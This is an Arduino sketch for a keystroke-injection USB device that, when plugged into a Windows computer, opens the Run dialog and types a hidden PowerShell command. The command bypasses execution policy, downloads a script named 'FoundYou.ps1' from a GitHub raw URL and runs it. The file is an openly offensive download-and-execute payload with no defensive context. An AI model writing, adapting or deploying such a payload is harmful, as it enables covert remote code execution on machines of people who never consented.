#include <Keyboard.h>

void runDialog() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(700);
}

void pressEnter() {
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
}

void setup() {
  delay(2500);
  Keyboard.begin();
  delay(800);

  runDialog();
  delay(500);
  Keyboard.print("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/MoeNassi/FoundYou/main/FoundYou.ps1; invoke-expression $pl");
  delay(500);
  pressEnter();

  Keyboard.end();
}

void loop() {}
